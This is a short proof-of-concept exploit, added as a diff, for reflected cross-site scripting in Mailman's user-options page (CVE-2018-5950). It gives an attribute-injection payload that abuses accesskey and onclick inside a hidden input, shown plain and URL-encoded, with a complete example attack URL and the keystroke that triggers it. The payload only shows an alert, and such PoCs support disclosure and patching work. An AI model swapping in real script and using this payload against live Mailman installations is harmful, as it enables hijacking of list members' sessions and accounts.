@@ -1,0 +1,29 @@
+# Title: Mailman 1.x > 2.1.23 - Cross Site Scripting (XSS)
+# Type:			Reflected XSS
+# Software:		Mailman
+# Version:		>=1.x <= 2.1.23
+# Vendor Homepage:	https://www.list.org
+# Original link:	https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5950
+# POC Author:		Valerio Alessandroni 
+# Date: 		28/10/2020
+# Description:		Cross-site scripting (XSS) vulnerability in the web UI in Mailman before 2.1.26 allows remote attackers to inject arbitrary web script or HTML via a user-options URL.
+#
+# https://127.0.0.1/cgi-bin/mailman/options/[LIST]/[EMAIL][XSS]
+# Which [LIST] is a valid list, [EMAIL] is a valid email and [XSS] is the payload
+#
+# For this POC I used the following payload
+# CVE:  CVE-2018-5950
+
+"accesskey%3d"x"onclick%3d"alert`XSS`"
+
+# Due the payload is loaded inside an HIDDEN INPUT TYPE, until today the only way to trigger the malicious code is via the accesskey attribute.
+# An URL Encoded version of the payload is 
+
+%22%61%63%63%65%73%73%6b%65%79%3d%22%78%22%6f%6e%63%6c%69%63%6b%3d%22%61%6c%65%72%74%60%58%53%53%60%22
+
+# URL Example:
+
+https://127.0.0.1/cgi-bin/mailman/options/list_name/test@test.com%22%61%63%63%65%73%73%6b%65%79%3d%22%78%22%6f%6e%63%6c%69%63%6b%3d%22%61%6c%65%72%74%60%58%53%53%60%22
+
+# In order to trigger the alert, the victim has to press the following buttons ALT+SHIFT+X
+# where X is an arbitrary button inserted as accesskey attribute in the payload.
